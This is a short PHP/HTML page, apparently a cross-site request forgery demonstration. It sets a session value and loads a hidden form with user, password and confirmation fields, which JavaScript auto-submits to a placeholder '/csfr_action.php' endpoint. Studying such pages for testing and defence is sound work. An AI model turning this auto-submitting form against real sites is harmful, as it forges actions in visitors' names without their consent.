<?php
// Start the session
session_start();
$_SESSION["confirmation"] = "confirm";
?>

<form method=POST action="/csfr_action.php" id="csfr_form"> 
   <input type=hidden name=user value="host"></input> 
    <input type=hidden name=password value="pass"></input>
    <input type=hidden name=confirmation value="confirm">

</input></form>

<script>document.forms[0].submit()</script>